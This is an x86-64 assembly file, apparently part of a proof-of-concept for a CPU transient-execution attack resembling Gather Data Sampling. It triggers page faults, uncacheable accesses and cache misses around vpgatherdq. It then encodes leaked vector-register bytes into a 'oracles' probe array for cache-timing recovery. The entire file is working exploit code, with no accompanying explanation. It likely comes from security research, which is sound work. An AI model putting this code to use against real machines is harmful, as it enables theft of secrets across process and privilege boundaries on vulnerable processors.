#include "config.h"

.data

.align 0x1000
    .global oracles
oracles:
    .space 128*4096*256, 0

    .global address_normal
address_normal:
    .space 4096*16, 0


    .global address_UC
address_UC:
    .space 4096, 0


address_helper:
    .space 4096*8, 0    


.global source
source:
    .space 4096, 0

     .global dest
dest:
    .space 4096, 0


.text



.macro encode_ymm
    vextracti128 $0, %ymm5, %xmm0
    pextrq $i%2, %xmm0, %rax
    
    mov %rax, %rbx
    mov %rax, %rcx
    mov %rax, %rdx
    mov %rax, %r8
    mov %rax, %r9
    mov %rax, %r10
    mov %rax, %r11
    
    mov $(0)*256*4096, %r13
    add %rsi, %r13
    shr $0, %rax
    and $0xff, %rax
    shlq $12, %rax
    mov (%r13,%rax,1), %rax

    mov $(1)*256*4096, %r13
    add %rsi, %r13
    shr $8, %rbx
    and $0xff, %rbx
    shlq $12, %rbx
    mov (%r13,%rbx,1), %rax

    mov $(2)*256*4096, %r13
    add %rsi, %r13
    shr $16, %rcx
    and $0xff, %rcx
    shlq $12, %rcx
    mov (%r13,%rcx,1), %rax

    mov $(3)*256*4096, %r13
    add %rsi, %r13
    shr $24, %rdx
    and $0xff, %rdx
    shlq $12, %rdx
    mov (%r13,%rdx,1), %rax

    mov $(4)*256*4096, %r13
    add %rsi, %r13
    shr $32, %r8
    and $0xff, %r8
    shlq $12, %r8
    mov (%r13,%r8,1), %rax

    mov $(5)*256*4096, %r13
    add %rsi, %r13
    shr $40, %r9
    and $0xff, %r9
    shlq $12, %r9
    mov (%r13,%r9,1), %rax

    mov $(6)*256*4096, %r13
    add %rsi, %r13
    shr $48, %r10
    and $0xff, %r10
    shlq $12, %r10
    mov (%r13,%r10,1), %rax

    mov $(7)*256*4096, %r13
    add %rsi, %r13
    shr $56, %r11
    and $0xff, %r11
    shlq $12, %r11
    mov (%r13,%r11,1), %rax
.endm

    # %rdi p perm
    # %rsi p oracle
    .align 0x1000
    .global s_load_encode
s_load_encode:

    lfence
    mfence 
    .rept 32
    inc %rax
    .endr  

#if AVX_512
    vmovups (%rdi), %zmm3
    vpxord %zmm1, %zmm1, %zmm1
    mov $0b1111111111111111, %rdi
    kmovq %rdi, %k1
    kmovq %rdi, %k2
#else
    vmovups (%rdi), %ymm3
    vpxord %ymm1, %ymm1, %ymm1
    vpcmpeqb %ymm2, %ymm2, %ymm2
#endif



#if ASSIST_UC
    lea address_UC, %r13
#else
    lea address_normal, %r13
#endif


#if P_CACHE_MISS
    lea address_helper, %rdi


    .set i,0
    .rept 8
    clflush 64*i(%rdi)
    mov 64*i(%rdi), %rax
    .set i,i+1
    .endr 
    

    .set i,0
    .rept 4
    xchg %rax, 64*i(%rdi)
    .set i,i+1
    .endr 
    

    .set i,0
    .rept 4
    lock incq 64*i(%rdi)
    .set i,i+1
    .endr 
    
#endif

#if P_PAGE_FAULT
    mov 0, %rdi
#endif
    
    
#if AVX_512
    vpgatherdq 0(%r13, %ymm1, 1), %zmm5{%k1} 
    vpermd %zmm5, %zmm3, %zmm5{%k2}
#else
    vpgatherdq %ymm2, 0(%r13, %xmm1, 1), %ymm5
    vpermd %ymm5, %ymm3, %ymm5
#endif

    encode_ymm
    ret
